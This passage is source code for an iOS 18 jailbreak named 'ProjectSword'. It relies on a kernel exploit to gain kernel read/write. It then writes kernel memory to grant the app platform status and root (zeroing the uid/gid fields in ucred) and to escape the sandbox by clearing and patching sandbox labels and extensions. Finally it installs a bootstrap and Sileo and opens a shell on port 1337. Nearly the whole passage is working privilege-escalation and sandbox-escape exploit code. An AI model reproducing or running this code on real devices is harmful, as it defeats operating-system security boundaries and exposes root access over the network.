            if (hdr == 0xc00000002 || hdr == 0xb00000000) break;
        }
        kb -= PAGE_SIZE;
    }
    gKernelBase = kb;
    gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
    printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);

    free(rBuf); free(wBuf);
    return true;
}

// ===== Kernel struct walking =====

uint64_t find_our_proc(void) {
    // wh1te4ever verified chain: rw socket inpcb -> socket -> so_background_thread
    // -> thread -> thread_ro -> proc
    // NOTE: every hop here is a PAC-authenticated kernel pointer on iOS 18;
    // must go through kread_ptr (which XPACI-strips) or we get garbage.
    uint64_t rwSocketAddr = kread_ptr(rwSocketPcb + OFFSET_PCB_SOCKET);
    if (!rwSocketAddr) return 0;
    uint64_t current_thread = kread_ptr(rwSocketAddr + OFFSET_SOCKET_BACKGROUND_THREAD);
    if (!current_thread) return 0;
    uint64_t current_thread_ro = kread_ptr(current_thread + OFFSET_THREAD_T_TRO);
    if (!current_thread_ro) return 0;
    uint64_t proc = kread_ptr(current_thread_ro + OFFSET_THREAD_RO_PROC);
    if (!proc) return 0;
    // validate: p_pid at 0x60 must be our pid
    if (kread32(proc + OFFSET_P_PID) != (uint32_t)getpid()) return 0;
    return proc;
}

uint64_t get_task_from_proc(uint64_t proc) {
    uint64_t p_proc_ro = kread_ptr(proc + OFFSET_P_PROC_RO);
    if (!p_proc_ro) return 0;
    return kread_ptr(p_proc_ro + OFFSET_PROC_RO_TASK);
}

uint64_t get_ucred_from_proc(uint64_t proc) {
    uint64_t p_proc_ro = kread_ptr(proc + OFFSET_P_PROC_RO);
    if (!p_proc_ro) return 0;
    return kread_ptr(p_proc_ro + OFFSET_PROC_RO_UCRED);
}

// auto-locate task->t_flags: TF_INIT (0x20000) + TF_HAS_BSD_INFO (0x80000) set,
// TF_PLATFORM (0x400) clear for a third-party app.
// NOTE: writing to a wrong offset corrupts the task, so only trust a clean match.
uint32_t detect_t_flags_offset(uint64_t task) {
    for (int off = 0x300; off <= 0x520; off += 4) {
        uint32_t v = kread32(task + off);
        if ((v & 0xA0000) == 0xA0000 && !(v & TF_PLATFORM)) return off;
    }
    return OFFSET_TASK_T_FLAGS;
}

static bool is_kaddr_valid(uint64_t addr) {
    return (addr & 0xfffff00000000000) == 0xfffff00000000000;
}

static void kdump(uint64_t addr, uint64_t len) {
    uint8_t *d = malloc(len);
    kread_buf(addr, d, len);
    for (uint64_t i = 0; i < len; i += 16) {
        printf("0x%llx: ", addr + i);
        for (uint64_t j = 0; j < 16 && i + j < len; j++) printf("%02x ", d[i + j]);
        printf("\n");
    }
    free(d);
}

// ===== Platformize (no PPL needed — task flags + uid in non-PPL memory) =====

bool platformize_proc(void) {
    gOurProc = find_our_proc();
    if (!gOurProc) {
        printf("[-] Cannot find our proc\n");
        return false;
    }
    gOurTask = get_task_from_proc(gOurProc);
    if (!gOurTask) {
        printf("[-] Cannot find our task\n");
        return false;
    }

    printf("[+] Our proc: 0x%llx\n", gOurProc);
    printf("[+] Our task: 0x%llx\n", gOurTask);

    // 1. Set TF_PLATFORM in task->t_flags (best-effort; offset auto-detected).
    // Only write when the current value looks like a real t_flags word
    // (TF_INIT|TF_HAS_BSD_INFO set, upper bits small) — otherwise the offset
    // guess is garbage and writing there would corrupt the task.
    uint32_t tfOff = detect_t_flags_offset(gOurTask);
    uint32_t t_flags = kread32(gOurTask + tfOff);
    printf("[*] t_flags @ +0x%x, before: 0x%x\n", tfOff, t_flags);
    bool flagsPlausible = ((t_flags & 0xA0000) == 0xA0000) &&
                          (t_flags >> 28) == 0;
    if (flagsPlausible && !(t_flags & TF_PLATFORM)) {
        t_flags |= TF_PLATFORM;
        kwrite32(gOurTask + tfOff, t_flags);
        printf("[+] TF_PLATFORM set: 0x%x\n", kread32(gOurTask + tfOff));
    } else if (!flagsPlausible) {
        printf("[*] t_flags value looks bogus, skipping TF_PLATFORM write\n");
    } else {
        printf("[*] TF_PLATFORM already set\n");
    }

    // 2. Set uid/gid 0 in ucred (proc_ro -> ucred on iOS 18)
    // Robust: zero every 32-bit field in the cred equal to our current uid/gid.
    uint64_t ucred = get_ucred_from_proc(gOurProc);
    if (ucred) {
        printf("[+] ucred: 0x%llx\n", ucred);
        printf("[*] cred dump (first 0x80):\n");
        kdump(ucred, 0x80);
        uid_t me_uid = getuid();
        gid_t me_gid = getgid();
        printf("[*] current uid=%d euid=%d gid=%d egid=%d\n",
               getuid(), geteuid(), getgid(), getegid());
        int zeroed = 0;
        for (uint64_t off = 0x10; off < 0x60; off += 4) {
            uint32_t v = kread32(ucred + off);
            if (v == (uint32_t)me_uid || v == (uint32_t)me_gid) {
                kwrite32(ucred + off, 0);
                zeroed++;
            }
        }
        printf("[+] ucred uid/gid fields zeroed: %d\n", zeroed);
        printf("[*] after: uid=%d euid=%d gid=%d egid=%d\n",
               getuid(), geteuid(), getgid(), getegid());
    } else {
        printf("[-] No ucred\n");
    }

    return true;
}

// ===== Sandbox escape =====

// Probe whether we can write outside the container.
static bool sandbox_probe(void) {
    char p[128];
    snprintf(p, sizeof(p), "/private/var/tmp/ps_sbx_%d", getpid());
    unlink(p);
    if (mkdir(p, 0755) == 0) {
        rmdir(p);
        return true;
    }
    return false;
}

// CrazyMind90-style extension-set patch.
// Pivots the "com.apple.sandbox.container" extension into a
// "com.apple.app-sandbox.read-write" extension rooted at "/".
// Struct layout reversed from ipad air m3 (T8122)/18.3.x by the author.
int patch_sandbox_ext(uint64_t cr_label) {
    uint64_t sbx = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
    if (!sbx || !is_kaddr_valid(sbx)) {
        printf("[-] patch_sandbox_ext: bad sandbox label 0x%llx\n", sbx);
        return -1;
    }
    // struct sandbox_label: +0x00 profile, +0x08 flags, +0x10 extension_set
    uint64_t ext_set = kread64(sbx + 0x10);
    if (!ext_set || !is_kaddr_valid(ext_set)) {
        printf("[-] patch_sandbox_ext: bad extension_set 0x%llx\n", ext_set);
        return -1;
    }
    // struct extension_set: type_buckets[9] at +0x00 (9 x 8 bytes)
    for (int i = 0; i < 9; i++) {
        uint64_t node = kread64(ext_set + i * 8);
        if (!node || !is_kaddr_valid(node)) continue;
        // struct extension_class_node: +0x00 next, +0x08 ext_list_head, +0x10 class_name
        uint64_t cls_name = kread_ptr(node + 0x10);
        if (!cls_name || !is_kaddr_valid(cls_name)) continue;
        char name[256] = {0};
        kread_buf(cls_name, name, sizeof(name) - 1);
        if (strstr(name, "com.apple.sandbox.container") == NULL) continue;

        uint64_t ext = kread64(node + 0x08); // ext_list_head
        if (!ext || !is_kaddr_valid(ext)) continue;
        // struct extension: +0x40 data_ptr, +0x48 path_len, +0x50 consumed,
        // +0x51 storage_class, +0x54 st_dev, +0x58 st_ino
        uint64_t path_buf = kread_ptr(ext + 0x40);
        if (!path_buf || !is_kaddr_valid(path_buf)) continue;

        uint8_t root_path[] = {'/', 0};
        kwrite_buf(path_buf, root_path, 2);
        const char *new_class = "com.apple.app-sandbox.read-write";
        kwrite_buf(path_buf + 2, (void *)new_class, strlen(new_class) + 1);

        // repoint class_name at the extension string we just wrote
        kwrite64(node + 0x10, path_buf + 2);

        kwrite64(ext + 0x48, 1);     // path_len
        kwrite8(ext + 0x50, 1);      // file.consumed
        kwrite8(ext + 0x51, 2);      // file.storage_class = SC_ISSUED

        struct stat st;
        stat("/", &st);
        kwrite32(ext + 0x54, (uint32_t)st.st_dev);
        kwrite64(ext + 0x58, (uint64_t)st.st_ino);

        // put the node in bucket[0]
        kwrite64(ext_set + 0, node);
        printf("[+] patch_sandbox_ext: pivoted container ext -> r/w on /\n");
        return 0;
    }
    printf("[-] patch_sandbox_ext: no container extension found\n");
    return -1;
}

bool escape_sandbox(void) {
    uint64_t ucred = get_ucred_from_proc(gOurProc);
    if (!ucred) {
        printf("[-] No ucred\n");
        return false;
    }
    printf("[+] ucred: 0x%llx\n", ucred);

    uint64_t cr_label = kread_ptr(ucred + OFFSET_CR_LABEL);
    printf("[*] cr_label: 0x%llx\n", cr_label);
    if (!cr_label || !is_kaddr_valid(cr_label)) {
        printf("[-] Bad cr_label\n");
        return false;
    }

    // Method 1: zero the sandbox perpolicy slot in the MAC label
    uint64_t sandbox = kread_ptr(cr_label + OFFSET_LABEL_SANDBOX);
    printf("[*] sandbox label: 0x%llx\n", sandbox);
    if (sandbox && is_kaddr_valid(sandbox)) {
        kwrite64(cr_label + OFFSET_LABEL_SANDBOX, 0);
        if (kread_ptr(cr_label + OFFSET_LABEL_SANDBOX) == 0)
            printf("[+] Sandbox slot zeroed\n");
    }

    // Method 2: CrazyMind90 extension patch (fallback)
    if (!sandbox_probe()) {
        printf("[*] Still sandboxed after slot zero, trying extension patch\n");
        patch_sandbox_ext(cr_label);
    }

    if (sandbox_probe()) {
        printf("[+] Sandbox escaped (verified: /private/var/tmp writable)\n");
        return true;
    }
    printf("[-] Still sandboxed (probe failed)\n");
    return false;
}

// ===== Bootstrap installation =====

static const char *jb_path = "/private/preboot/jb";
static const char *jb_var = "/var/jb";

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[4096];
    strncpy(tmp, path, sizeof(tmp) - 1);
    for (char *p = tmp + 1; *p; p++) {
        if (*p == '/') {
            *p = 0; mkdir(tmp, mode); *p = '/';
        }
    }
    return mkdir(tmp, mode);
}

bool setup_jb_symlink(void) {
    unlink(jb_var);
    if (symlink(jb_path, jb_var) != 0) {
        printf("[-] symlink: %s\n", strerror(errno));
        return false;
    }
    printf("[+] %s -> %s\n", jb_var, jb_path);
    return true;
}

bool install_bootstrap(void) {
    struct stat st;

    // Ensure the preboot filesystem is writable first.
    remount_private_preboot();

    if (stat(jb_path, &st) != 0) {
        if (mkdir_p(jb_path, 0755) != 0) {
            printf("[-] mkdir %s: %s\n", jb_path, strerror(errno));
            return false;
        }
    }

    // The Procursus rootless tar ships with "./var/jb/..." paths baked in,
    // so it must be extracted at "/" and resolved through the /var/jb
    // symlink -> /private/preboot/jb. Extracting with -C /private/preboot/jb
    // would produce /private/preboot/jb/var/jb/... which is wrong.
    if (!setup_jb_symlink()) return false;

    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) != 0) return false;
    char *slash = strrchr(self_path, '/');
    if (!slash) return false;
    *slash = 0;

    char tar_path[4096];
    snprintf(tar_path, sizeof(tar_path), "%s/bootstrap.tar", self_path);
    if (stat(tar_path, &st) != 0) {
        printf("[-] No bootstrap.tar at %s\n", tar_path);
        printf("[*] Creating minimal bootstrap directory structure\n");
        mkdir_p("/var/jb/usr/bin", 0755);
        mkdir_p("/var/jb/usr/lib", 0755);
        mkdir_p("/var/jb/Applications", 0755);
        mkdir_p("/var/jb/etc", 0755);
        mkdir_p("/var/jb/Library", 0755);
        return true;
    }

    // We have a bootstrap.tar, extract it at "/" so ./var/jb/... resolves
    // through the symlink. We are root + unsandboxed here, so this is legal.
    // Prefer the system bsdtar; fall back to a tar shipped with the app or in
    // a previous bootstrap install.
    char tar_candidates[3][4096];
    int nc = 0;
    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "/usr/bin/tar");
    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "%s/tar", self_path);
    snprintf(tar_candidates[nc++], sizeof(tar_candidates[0]), "/var/jb/usr/bin/tar");
    char tar_path[4096] = "";
    for (int i = 0; i < nc; i++) {
        if (stat(tar_candidates[i], &st) == 0) {
            snprintf(tar_path, sizeof(tar_path), "%s", tar_candidates[i]);
            break;
        }
    }
    if (tar_path[0] == 0) {
        printf("[-] No usable tar binary found\n");
        return false;
    }
    printf("[*] Using tar: %s\n", tar_path);

    const char *argv[] = {
        tar_path,
        "--preserve-permissions",
        "-xkf",
        tar_path,
        "-C",
        "/",
        NULL
    };

    pid_t pid;
    int ret = posix_spawnp(&pid, tar_path, NULL, NULL,
        (char *const *)argv, NULL);
    if (ret != 0) {
        printf("[-] tar spawn: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
        printf("[-] tar exit: %d\n", WEXITSTATUS(status));
        return false;
    }
    printf("[+] Bootstrap extracted to %s\n", jb_path);

    // Run prep_bootstrap.sh (shebang: #!/var/jb/bin/sh). Skip the interactive
    // uialert password prompt for unattended installs.
    char prep_path[4096];
    snprintf(prep_path, sizeof(prep_path), "%s/prep_bootstrap.sh", jb_path);
    if (stat(prep_path, &st) == 0) {
        printf("[*] Running prep_bootstrap.sh (NO_PASSWORD_PROMPT=1)...\n");
        setenv("NO_PASSWORD_PROMPT", "1", 1);
        char sh_path[4096];
        snprintf(sh_path, sizeof(sh_path), "%s/bin/sh", jb_path);
        const char *prep_argv[] = { sh_path, prep_path, NULL };
        ret = posix_spawnp(&pid, sh_path, NULL, NULL,
            (char *const *)prep_argv, NULL);
        if (ret != 0) {
            printf("[-] prep_bootstrap.sh spawn: %s\n", strerror(ret));
        } else {
            waitpid(pid, &status, 0);
            printf("[+] prep_bootstrap.sh exited: %d\n",
                WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        }
    } else {
        printf("[*] No prep_bootstrap.sh in bootstrap (skipping)\n");
    }

    // Load trust caches from the bootstrap (needs TC injection primitive).
    char tc_path[4096];
    snprintf(tc_path, sizeof(tc_path), "%s/TrustCache", jb_path);
    if (stat(tc_path, &st) == 0) {
        printf("[*] Trust cache found at %s\n", tc_path);
        load_trust_cache(tc_path);
    }

    return true;
}

bool install_sileo(void) {
    char sileo_path[4096];
    snprintf(sileo_path, sizeof(sileo_path), "%s/Applications/Sileo.app", jb_path);
    struct stat st;

    // If Sileo is already registered from a previous install, skip.
    if (stat(sileo_path, &st) == 0) {
        printf("[*] Sileo.app already present\n");
        goto uicache_step;
    }

    // Sileo is not part of the Procursus bootstrap; look for a bundled .deb
    // (e.g. org.coolstar.sileo_*.deb) next to the app and install via dpkg.
    char self_path[4096] = {};
    uint32_t size = sizeof(self_path);
    if (_NSGetExecutablePath(self_path, &size) == 0) {
        char *slash = strrchr(self_path, '/');
        if (slash) {
            *slash = 0;
            char pattern[4096];
            snprintf(pattern, sizeof(pattern), "%s/*.deb", self_path);
            glob_t g;
            if (glob(pattern, 0, NULL, &g) == 0) {
                char *deb = NULL;
                for (size_t i = 0; i < g.gl_pathc; i++) {
                    if (strstr(g.gl_pathv[i], "sileo") || strstr(g.gl_pathv[i], "Sileo")) {
                        deb = g.gl_pathv[i];
                        break;
                    }
                }
                if (deb) {
                    printf("[*] Installing Sileo from %s\n", deb);
                    char dpkg[4096];
                    snprintf(dpkg, sizeof(dpkg), "%s/usr/bin/dpkg", jb_path);
                    const char *args[] = { "dpkg", "-i", deb, NULL };
                    pid_t pid;
                    int ret = posix_spawnp(&pid, dpkg, NULL, NULL,
                        (char *const *)args, NULL);
                    if (ret != 0) {
                        printf("[-] dpkg: %s\n", strerror(ret));
                    } else {
                        int status;
                        waitpid(pid, &status, 0);
                        printf("[+] dpkg exited: %d\n",
                            WIFEXITED(status) ? WEXITSTATUS(status) : -1);
                    }
                } else {
                    printf("[-] No Sileo .deb bundled in app\n");
                }
                globfree(&g);
            }
        }
    }

    if (stat(sileo_path, &st) != 0) {
        printf("[-] Sileo.app not present after install\n");
        return false;
    }

uicache_step:
    // Register Sileo with SpringBoard via uicache from the bootstrap.
    char uicache_path[4096];
    snprintf(uicache_path, sizeof(uicache_path), "%s/usr/bin/uicache", jb_path);
    const char *args[] = { "uicache", "-p", sileo_path, NULL };
    pid_t pid;
    int ret;
    if (stat(uicache_path, &st) == 0) {
        ret = posix_spawnp(&pid, uicache_path, NULL, NULL,
            (char *const *)args, NULL);
    } else {
        ret = posix_spawnp(&pid, "/usr/bin/uicache", NULL, NULL,
            (char *const *)args, NULL);
    }
    if (ret != 0) {
        printf("[-] uicache: %s\n", strerror(ret));
        return false;
    }
    int status;
    waitpid(pid, &status, 0);
    printf("[+] Sileo registered\n");
    return true;
}

// ===== Trust cache injection =====

// On iOS 18 (A14) the static trust cache list head (pmap_image4_trust_caches)
// and the trust cache memory live in PPL-protected regions. A raw kernel
// kwrite to them fails silently at best and can panic (MAC zone) at worst.
// Injection therefore MUST go through a PPL-capable write. This is the exact
// seam where a physrw/PPL-bypass primitive plugs in; until one is available
// we report the blocker explicitly instead of blind-writing.
//
// PPL write path: implemented when a PPL bypass is present.
//   - Fugu18 oobPCI physrw.c provides the reference pattern (A14 = PPL only).
static bool ppl_kwrite64(uint64_t addr, uint64_t val) {
    // TODO(physrw): replace with real PPL write once the bypass lands.
    (void)addr; (void)val;
    printf("[-] ppl_kwrite64: PPL write primitive not available yet\n");
    return false;
}

// kalloc in kernel space for the trust cache module + blob. Fugu15 allocates
// data.count + 0x10 bytes.
static uint64_t kalloc_for_trust_cache(size_t size) {
    // TODO(physrw): a real kalloc (via PPL/zone) replaces this.
    (void)size;
    printf("[-] kalloc_for_trust_cache: no kernel allocator available yet\n");
    return 0;
}

bool load_trust_cache(const char *tc_path) {
    printf("[*] load_trust_cache(%s)\n", tc_path);

    // Validate the Fugu15 tcload format up front so a good file is
    // distinguishable from injection failure in the shell `tc` command.
    FILE *fp = fopen(tc_path, "rb");
    if (!fp) {
        printf("[-] Cannot open trust cache: %s\n", strerror(errno));
        return false;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (fsize < 0x18) {
        printf("[-] Trust cache too small (%ld)\n", fsize);
        fclose(fp);
        return false;
    }
    uint8_t *buf = malloc(fsize);
    if (fread(buf, 1, fsize, fp) != (size_t)fsize) {
        printf("[-] Failed to read trust cache\n");
        free(buf); fclose(fp);
        return false;
    }
    fclose(fp);

    uint32_t vers  = *(uint32_t *)(buf + 0x00);
    uint32_t count = *(uint32_t *)(buf + 0x14);
    if (vers != 1) {
        printf("[-] Bad trust cache version %u (need 1)\n", vers);
        free(buf);
        return false;
    }
    if (fsize != 0x18 + ((long)count * 22)) {
        printf("[-] Bad trust cache length: %ld != 0x%x\n", fsize, 0x18 + (count * 22));
        free(buf);
        return false;
    }
    printf("[+] Trust cache OK: version %u, %u hashes (%ld bytes)\n",
        vers, count, fsize);

    // Injection itself needs three primitives that are not yet available:
    //   1. pmap_image4_trust_caches address (needs kernel symbols/patchfinder)
    //   2. a PPL-capable write (physrw bypass — Fugu18 oobPCI pattern)
    //   3. a kernel allocator for the trust_cache_module + blob
    // We deliberately do NOT blind-write here: a kwrite to PPL memory can
    // panic the device exactly like the MAC-zone panic we already fixed.
    uint64_t mem = kalloc_for_trust_cache(fsize + 0x10);
    if (!mem) {
        free(buf);
        return false;
    }

    // Fugu15 tcload splice (once PPL is available):
    //   mem+0x00 = old list head   (our next)
    //   mem+0x08 = &mem+0x10       (pointer to our blob)
    //   mem+0x10 = blob (version/count/hashes)
    // then write mem into the pmap_image4_trust_caches head slot.
    if (!ppl_kwrite64(mem + 0x8, mem + 0x10)) {
        printf("[-] Trust cache injection blocked: no PPL write path\n");
        free(buf);
        return false;
    }

    printf("[-] Trust cache injection incomplete (PPL bypass required)\n");
    free(buf);
    return false;
}

bool remount_private_preboot(void) {
    // Try to remount via mount() syscall
    int ret = mount("apfs", "/private/preboot", MNT_UPDATE, NULL);
    if (ret != 0) {
        printf("[-] mount -u /private/preboot: %s\n", strerror(errno));
        return false;
    }
    printf("[+] /private/preboot remounted r/w\n");
    return true;
}

// ===== Shell =====
#include "shell.h"

// ===== Main Jailbreak Flow =====

void run_jailbreak(void) {
    @autoreleasepool {
        printf("=== ProjectSword - iOS 18.2.1 A14 ===\n\n");

        // Phase 1: DarkSword ICMP6 kernel exploit
        printf("[Phase 1] Running DarkSword exploit...\n");
        if (!run_darksword()) {
            printf("[-] Exploit failed (no kernel R/W)\n");
            return;
        }
        printf("[+] Kernel R/W via ICMP6 sockets\n\n");

        // Phase 2: Platformize (set TF_PLATFORM + root)
        printf("[Phase 2] Platformize...\n");
        if (platformize_proc()) {
            printf("[+] Platformized (TF_PLATFORM + uid 0)\n\n");
        } else {
            printf("[-] Platformize failed\n");
            return;
        }

        // Phase 3: Sandbox escape
        printf("[Phase 3] Sandbox escape...\n");
        if (escape_sandbox()) {
            printf("[+] Sandbox escaped\n\n");
        } else {
            printf("[-] Sandbox escape failed\n");
        }

        // Phase 4: Bootstrap
        printf("[Phase 4] Bootstrap...\n");
        install_bootstrap();
        printf("\n");

        // Phase 5: Sileo
        printf("[Phase 5] Sileo...\n");
        install_sileo();
        printf("\n");

        printf("=== Jailbreak Ready ===\n");
        printf("uid: %d  (should be 0)\n", getuid());
        printf("Kernel base: 0x%llx\n", gKernelBase);
        printf("Kernel slide: 0x%llx\n\n", gKernelSlide);

        printf("Starting shell on port 1337...\n");
        start_shell(1337);
    }
}

// ===== Entry Point =====
int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}

#pragma clang diagnostic pop
